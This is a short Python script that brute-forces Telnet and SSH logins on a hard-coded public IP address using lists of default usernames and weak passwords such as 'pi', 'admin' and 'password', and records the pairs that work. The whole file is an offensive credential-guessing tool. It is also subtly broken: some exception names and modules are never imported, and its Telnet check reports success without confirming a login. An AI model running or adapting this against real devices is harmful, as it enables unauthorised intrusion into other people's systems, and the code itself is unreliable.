import telnetlib
from xmlrpc.client import Fault
import paramiko

target_ip_address = ['157.82.207.245']
id_list = ['pi', 'admin', 'user', 'usr', 'default']
pass_list = ['qwerty', '123456789', 'password', 'password123',
             'pi', 'admin', 'user', 'usr', 'default']


def telnet_login(ip, id, password):
    try:
        tn = telnetlib.Telnet(ip)
    except EOFError:
        print('cannot connect to the ip address')
        return False
    try:
        tn.read_until("login: ", timeout=10.0)
        tn.write(id + "\n")
    except EOFError:
        print('wrong id')
        return False
    try:
        tn.read_until("Password: ", timeout=10.0)
        tn.write(password + "\n")
    except EOFError:
        print('wrong password')
        return False
    print('successfully connected')
    return True


def ssh_login(ip, id, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    try:
        client.connect(ip,
                       username=id,
                       password=password,
                       timeout=10.0)
    except (SSHException, BadHostKeyException, AuthenticationException, socket.error):
        print('cannot connect to the host')
        return False
    print('successfully connected')
    return True

def main():
    result = []
    for ip in target_ip_address:
        for id in id_list:
            for password in pass_list:
                if telnet_login(ip, id, password):
                    result.append(['telnet', ip, id, password])
                else:
                    if ssh_login(ip, id, password):
                        result.append(['ssh', ip, id, password])
    return result


if __name__ == '__main__':
    main()